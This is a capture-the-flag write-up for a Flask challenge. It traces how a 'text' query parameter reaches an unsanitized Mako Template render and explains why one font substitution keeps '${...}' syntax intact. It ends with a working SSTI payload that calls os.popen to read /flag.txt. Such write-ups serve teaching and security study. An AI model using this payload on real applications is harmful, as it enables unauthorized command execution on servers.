# Challenge Analysis

The challenge provides the web application source code to us.
Looking at `application/blueprints/routes.py` we see notice that the `text` query parameter is passed to the `spookify` function.

```
@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

Analyzing the `spookify` function in `application/util.py` we see that the `text` parameter is passed to the `change_font` function.

```
def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)
```

The `change_font` function is simply replacing characters to the provided input, according to a substitution dictionary, and put everything in the `converted_fonts` list.
This list is subsequentially passed to the `generate_render` function.

```
def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts
```

The `generate_render` function builds a string called `result` based on the values contained inside the `converted_fonts` list using a python format string. Afterwards, it calls the `Template(result).render()` function over the `result` string.

```
def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()
```

Given the current dataflow, we see observe that the query parameter `text` is being inserted inside the `result` function, which is later passed to the `Mako` render engine, with no sanitization whatsoever. This might be vulnerable to SSTI. 

---
## Observations

One important observation is that the first three strings in the `converted_fonts` dictionary cannot contain any dangerous template syntax. This is because of how the `change_font` function performs character substitution.

The function builds a list of four transformed versions of the input string using different substitution dictionaries. In the first three cases, only alphabetic characters are replaced. All other characters — including special symbols like `$`, `{`, and `}` — are either removed or not preserved in a way that keeps their original meaning. As a result, any template-specific syntax is effectively destroyed in these versions.

The fourth element, however, behaves differently. It replaces alphanumeric and special characters with themselves, meaning most characters remain unchanged. In practice, this results in little to no transformation (except for characters not explicitly defined in the substitution dictionary). Because the template syntax is preserved in this case, any `${...}` expression survives intact and is later interpreted by the template engine.

This means that SSTI is actually exploitable in the current configuration. Furthermore, exploitation should be trivial, considering that the environment is not being sandboxed, which means, we should be able to have full access to the Python runtime.

---
# Exploitation

To exploit the vulnerability, we can simply pass the following value to the `text` parameter, which allows to access the `os.popen` function to execute any system command and read its output using the `read()` function

```
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

---
# References

https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#mako
